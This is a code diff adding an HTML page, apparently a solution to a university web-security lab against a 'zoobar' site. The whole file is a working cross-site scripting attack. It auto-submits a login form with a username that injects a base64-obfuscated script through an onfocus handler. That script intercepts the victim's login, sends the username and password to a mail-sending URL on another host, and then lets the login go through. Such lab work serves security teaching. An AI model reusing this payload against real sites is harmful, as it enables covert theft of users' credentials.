@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Part 3</title>
+</head>
+<body>
+
+<form action="http://zoobar.csl.toronto.edu/index.php" method="POST">
+    <input type="text" name="loginusername"/>
+    <input type="password" name="loginpassword"/>
+    <input type="hidden" name="submitlogin" value="Log in"/>
+</form>
+
+<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+<script id="hack" type="text/javascript">
+    (function () {
+		// make sure only execute once
+		if(window.hacked) return;
+		else window.hacked = true;
+		
+		// Email setting
+		var emailTo = "zhuding1";
+		var emailNetId = "zhuding1";
+
+		// find DOM elements
+        var form = document.getElementsByName("login_form")[0];
+        var username = document.getElementsByName("loginusername")[0];
+        var password = document.getElementsByName("loginpassword")[0];
+        var warning = document.getElementsByClassName("warning")[0];
+		var button = document.getElementsByName("submitlogin")[0];
+
+		var submitHandle = function(e) {
+			// prevent default submit action
+			e.preventDefault();
+			e.stopPropagation();
+
+			// generte email script
+			var script = document.createElement("script");
+			script.src="http://ece568.csl.toronto.edu/a3/sendmail.php?to=" + emailTo + "&netid=" + emailNetId +"&payload=" 
+						+ encodeURIComponent(username.value + "," + password.value);
+			
+			script.addEventListener("load", function(){
+				// remove submit handle to allow submit to go through
+				form.removeEventListener("submit", submitHandle);
+				button.click();
+			});
+			document.body.appendChild(script);
+        }
+
+		// remove warnings and attach submit handle
+        warning.innerHTML =  username.value = "";
+        form.addEventListener("submit", submitHandle);
+    })();
+</script>
+
+<script type="text/javascript">
+    $(document).ready(function() {
+        var $script = $("#hack");
+        var encodedScript = btoa($script.text());
+        $("[name=loginusername]").val("user onfocus=(!window.hacked)&&eval(atob(\"" + encodedScript + "\"))");
+        $("[name=loginpassword]").val("password");
+        $("form").submit();
+    });
+</script>
+</body>
+</html>
